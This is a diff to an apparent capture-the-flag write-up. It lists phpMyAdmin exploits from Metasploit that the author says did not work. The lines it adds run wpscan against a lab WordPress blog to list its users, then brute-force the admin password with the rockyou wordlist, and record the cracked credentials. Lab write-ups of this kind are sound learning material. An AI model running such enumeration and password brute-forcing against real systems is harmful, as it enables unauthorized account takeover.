@@ -49,5 +49,11 @@ Tried every exploit on metasploit as follows, but they didn't work.
 	7  exploit/multi/http/phpmyadmin_null_termination_exec   2016-06-23       excellent  Yes    phpMyAdmin Authenticated Remote Code Execution
 	8  exploit/multi/http/phpmyadmin_preg_replace            2013-04-25       excellent  Yes    phpMyAdmin Authenticated Remote Code Execution via preg_replace()
 
+Scanned $TARGET_IP/blog using wordpress scanning tool, wpscan  
+	```wpscan --url 10.10.111.161/blog -e vp,u```
+	One user found: admin  
 
+Using this info, bruteforced passwords  
+	```wpscan --url 10.10.111.161/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50```
+	Password Cracked: Username: admin, Password: my2boys  
 
